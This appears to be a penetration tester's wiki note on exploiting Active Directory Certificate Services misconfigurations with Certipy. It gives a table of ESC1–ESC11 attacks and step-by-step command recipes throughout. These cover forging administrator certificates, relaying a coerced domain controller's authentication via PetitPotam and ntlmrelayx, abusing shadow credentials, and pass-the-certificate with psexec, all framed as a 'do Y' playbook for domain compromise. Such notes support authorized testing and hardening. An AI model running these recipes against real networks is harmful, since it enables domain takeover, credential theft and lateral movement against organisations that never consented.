---
tags: [pentest, adcs, certipy, esc, ad, active-directory, initial-access, windows]
phase: 5
---
# Certipy - AD CS ESC Attacks

Active Directory Certificate Services is a goldmine. `certipy` enumerates and exploits ESC1-ESC11+ misconfigurations.

[[06 - Gaining Access/00 - README|Folder index]]

## Install

```bash
pipx install certipy-ad
certipy --version
```

## Find vulnerabilities

```bash
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.5 -vulnerable -stdout
# Saves JSON + text report; highlights vulnerable templates
```

## ESC reference

| ESC | Misconfiguration | Exploit |
| --- | --- | --- |
| **ESC1** | Template: enrollee supplies subject + Client Auth EKU + low-priv enrollment | `certipy req -u user -p pass -ca <CA> -template <T> -upn administrator@corp.local` |
| **ESC2** | Template: "Any Purpose" EKU | Same as ESC1 |
| **ESC3** | Enrollment Agent template + abusable destination template | Request agent cert, then enroll-on-behalf-of admin |
| **ESC4** | Vulnerable template ACL (write rights) | Modify template to make it ESC1, then exploit |
| **ESC6** | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` set | Specify any UPN in CSR via `-upn` |
| **ESC7** | Vulnerable CA ACL (ManageCA / ManageCertificates) | Grant yourself + enable ESC6 |
| **ESC8** | HTTP web enrollment endpoint enabled | NTLM relay → request cert as victim |
| **ESC9** | No security extension on template + UPN-based auth | Set UPN of low-priv user to admin's UPN |
| **ESC10** | StrongCertificateBindingEnforcement weak | Similar to ESC9 with different prereqs |
| **ESC11** | RPC enrollment without sign | Relay via PetitPotam |

## ESC1 recipe (the most common)

```bash
# Identify vulnerable template
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.5 -vulnerable -stdout

# Request cert as administrator
certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip 10.0.0.5

# Cert saved as administrator.pfx

# Authenticate with the cert → get TGT + NT hash
certipy auth -pfx administrator.pfx
# Output:
#   [*] Got TGT: ...
#   [*] NT hash: 31d6cfe0...
```

Now you have admin TGT + NTLM hash → PtH everywhere.

## ESC8 recipe (relay)

```bash
# Discover ADCS web enrollment endpoint
certipy find -u user -p pass -dc-ip <dc> -stdout | grep -i "Web Enrollment"

# Run ntlmrelayx targeting it
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs \
  --template "DomainController" -smb2support

# Coerce a DC to auth back
python3 PetitPotam.py 10.10.14.5 <dc-ip>
# or Coercer.py / dfscoerce.py

# Relay captures DC's auth → cert for DC
# Use that cert with `certipy auth` → DC's TGT → DCSync everything
```

## Shadow Credentials (msDS-KeyCredentialLink abuse)

When you have `AddKeyCredentialLink` on a target user:

```bash
certipy shadow auto -u attacker@corp.local -p pass -account victim -dc-ip <dc>
# Adds attacker's public key to victim's msDS-KeyCredentialLink
# Then authenticates as victim → gets TGT + NTLM
```

## Pass-the-Certificate

```bash
certipy auth -pfx user.pfx
# Returns TGT + NT hash; export and use:
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass corp.local/user@host
```

## When you see X, do Y

| Output | Meaning |
| --- | --- |
| `ESC1` | Quick win. Request cert as admin. |
| `ESC8` | Need to coerce + relay. |
| `Enrollment Agent` allowed for a user | ESC3 - on-behalf-of attack. |
| `KDC_ERR_PADATA_TYPE_NOSUPP` on cert auth | DC may not support PKINIT, or template's EKU is wrong. |

> [!tip] Always run `certipy find -vulnerable` on every AD engagement.
> AD CS is everywhere and is one of the highest-impact misconfig categories in Active Directory. Even partial-priv accounts often have a path via templates.

## See also

- [[12 - ntlmrelayx]] (ESC8 relay)
- [[22 - Coercion (PetitPotam Coercer)]]
